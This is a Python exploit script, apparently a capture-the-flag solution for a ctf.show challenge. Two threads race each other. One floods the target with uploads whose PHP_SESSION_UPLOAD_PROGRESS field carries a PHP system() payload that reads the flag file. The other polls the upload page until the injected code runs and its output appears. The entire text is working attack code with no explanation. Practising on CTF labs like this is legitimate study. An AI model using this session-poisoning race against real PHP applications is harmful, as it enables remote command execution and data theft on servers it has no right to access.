import requests
import threading

session = requests.session()
sess = 'abc'
url1 = "http://3d73b7ed-d019-4483-a8cc-9f8be40220a5.challenge.ctf.show/"
url2 = "http://3d73b7ed-d019-4483-a8cc-9f8be40220a5.challenge.ctf.show/upload"
data1 = {
    'PHP_SESSION_UPLOAD_PROGRESS': '<?php system("tac ../f*");?>'
}
file = {
    'file': 'abc'
}
cookies = {
    'PHPSESSID': sess
}


def write():
    while True:
        r = session.post(url1, data=data1, files=file, cookies=cookies)


def read():
    while True:
        r = session.get(url2)
        if 'flag' in r.text:
            print(r.text)


threads = [threading.Thread(target=write),
           threading.Thread(target=read)]
for t in threads:
    t.start()
